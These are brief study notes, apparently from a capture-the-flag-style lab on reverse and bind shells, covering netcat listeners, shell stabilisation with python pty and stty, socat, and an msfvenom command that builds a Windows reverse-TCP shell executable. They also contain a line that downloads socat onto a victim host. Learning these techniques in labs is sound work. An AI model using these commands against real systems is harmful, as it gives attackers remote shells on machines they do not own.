Netcat<br>
Socat - netcat on steroids<br>
MSFvenom<br>
Multi/handler/<br>




## Shell Types
- Reverse Shells - connects back
- bind shells - remote code execution



## Common Commands
<font color=red> nc -lvnp <port-number></font>


- -l is used to tell netcat that this will be a listener
- -v is used to request a verbose output
- -n tells netcat not to resolve host names or use DNS. Explaining this is outwith the scope of the room.
- -p indicates that the port specification will follow.


# Techniques
 ## 1. Python
 - python -c 'import pty;pty.spawn("/bin/bash")'
 - export TERM=xterm <font color=pink> gives access to commnads</font>
 - stty raw -echo; fg <font color=pink>removes echo of our own shell and foregrounds the process</font>

## 2. rlwrap
- rlwrap nc -lvnp <port>
- stty raw -echo; fg

## 3. Socat
- wget IP /socat -O /tmp/socat
- stty rows number



### Creating and deploying socat on victim
- openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
- cat shell.key shell.crt > shell.pem


## 4 Msfvenom
 - msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=IP LPORT=port

 StageLess Payloads ( _ )
 Staged Payloads (/)